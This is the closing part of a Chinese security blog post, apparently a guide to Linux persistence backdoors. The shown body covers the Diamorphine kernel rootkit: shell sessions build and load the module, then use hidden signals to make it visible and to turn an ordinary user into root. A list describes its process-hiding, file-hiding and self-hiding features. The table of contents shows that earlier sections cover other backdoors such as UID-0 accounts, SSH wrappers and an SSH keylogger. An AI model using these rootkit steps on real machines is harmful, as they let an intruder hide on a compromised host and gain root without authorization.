+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@vuln</span> test]<span class="meta"># cd Diamorphine</span></span><br><span class="line">[root<span class="symbol">@vuln</span> Diamorphine]<span class="meta"># make</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#加载模块</span></span><br><span class="line">[root<span class="symbol">@vuln</span> Diamorphine]<span class="meta"># insmod diamorphine.ko</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#该模块默认是隐藏的，要想可见执行</span></span><br><span class="line">[root<span class="symbol">@vuln</span> Diamorphine]<span class="meta"># lsmod | grep -i Diamorphine</span></span><br><span class="line">[root<span class="symbol">@vuln</span> Diamorphine]<span class="meta"># kill -63 0</span></span><br><span class="line">[root<span class="symbol">@vuln</span> Diamorphine]<span class="meta"># lsmod | grep -i Diamorphine</span></span><br><span class="line">diamorphine            <span class="number">16384</span>  <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>使用</p>
+<ul>
+<li>When loaded, the module starts invisible;</li>
+<li>Hide/unhide any process by sending a signal 31;</li>
+<li>Sending a signal 63(to any pid) makes the module become (in)visible;</li>
+<li>Sending a signal 64(to any pid) makes the given user become root;</li>
+<li>Files or directories starting with the MAGIC_PREFIX become invisible;</li>
+</ul>
+<p>提权到root(必须root加载的模块)</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="variable">@vuln</span> Diamorphine]<span class="comment"># su shadowtest</span></span><br><span class="line"><span class="variable">$ </span>whoami</span><br><span class="line">shadowtest</span><br><span class="line"><span class="variable">$ </span>su root</span><br><span class="line">密码：</span><br><span class="line"><span class="symbol">su:</span> 鉴定故障</span><br><span class="line"><span class="variable">$ </span>kill <span class="number">-64</span> 0</span><br><span class="line"><span class="variable">$ </span>whoami</span><br><span class="line">root</span><br><span class="line"><span class="variable">$ </span>su root</span><br><span class="line">[root<span class="variable">@vuln</span> Diamorphine]<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="14-参考"><a href="#14-参考" class="headerlink" title="14. 参考"></a>14. 参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://whoamianony.top/2021/10/22/Web%E5%AE%89%E5%85%A8/%E6%9C%89%E8%B6%A3%E7%9A%84%20LD_PRELOAD/">https://whoamianony.top/2021/10/22/Web%E5%AE%89%E5%85%A8/%E6%9C%89%E8%B6%A3%E7%9A%84%20LD_PRELOAD/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoxiaosen/p/13359729.html">https://www.cnblogs.com/xiaoxiaosen/p/13359729.html</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Linux%E5%AE%89%E5%85%A8/" rel="tag"># Linux安全</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%E4%B8%8E%E5%8F%8D%E5%B0%84/" rel="prev" title="java类加载机制与反射">
+      <i class="fa fa-chevron-left"></i> java类加载机制与反射
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/CodeQL1-%E4%BA%86%E8%A7%A3CodeQL/" rel="next" title="CodeQL1-了解CodeQL">
+      CodeQL1-了解CodeQL <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-Apache-%E6%A8%A1%E5%9D%97%E5%90%8E%E9%97%A8"><span class="nav-text">1. Apache 模块后门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E6%89%8B%E5%8A%A8%E6%9E%84%E9%80%A0apache-module%E5%90%8E%E9%97%A8"><span class="nav-text">1.1 手动构造apache module后门</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Systemd%E5%90%8E%E9%97%A8"><span class="nav-text">2. Systemd后门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-Systemd%E6%9C%8D%E5%8A%A1"><span class="nav-text">2.1 Systemd服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E6%9E%84%E9%80%A0System%E5%90%8E%E9%97%A8"><span class="nav-text">2.2 构造System后门</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-Nginx%E5%90%8E%E9%97%A8"><span class="nav-text">3. Nginx后门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-nginx%E6%A8%A1%E5%9D%97%E5%90%8E%E9%97%A8"><span class="nav-text">3.1 nginx模块后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-nginx-lua"><span class="nav-text">3.2 nginx + lua</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%90%8E%E9%97%A8"><span class="nav-text">4. 计划任务后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%90%8E%E9%97%A8"><span class="nav-text">5. 环境变量后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-ld-preload%E5%90%8E%E2%BB%94"><span class="nav-text">6. ld_preload后⻔</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-ssh%E5%85%AC%E9%92%A5%E5%85%8D%E5%AF%86"><span class="nav-text">7. ssh公钥免密</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-%E5%88%9B%E5%BB%BAuid%E4%B8%BA0%E7%9A%84%E5%90%8E%E9%97%A8%E8%B4%A6%E6%88%B7"><span class="nav-text">8. 创建uid为0的后门账户</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-SSH-wrapper%E5%90%8E%E9%97%A8"><span class="nav-text">9. SSH wrapper后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-ssh-%E8%BD%AF%E8%BF%9E%E6%8E%A5"><span class="nav-text">10. ssh 软连接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-suid-shell"><span class="nav-text">11. suid shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#12-SSH-Keylogger%EF%BC%88Strace%EF%BC%89"><span class="nav-text">12 SSH Keylogger（Strace）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#13-Diamorphine%E5%90%8E%E9%97%A8"><span class="nav-text">13. Diamorphine后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#14-%E5%8F%82%E8%80%83"><span class="nav-text">14. 参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ShadowFl0w"
+      src="/images/touxiang.jpeg">
+  <p class="site-author-name" itemprop="name">ShadowFl0w</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">54</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">34</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ShadowFl0w" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ShadowFl0w" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/ShadowFl0w" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;ShadowFl0w" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ShadowFl0w</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
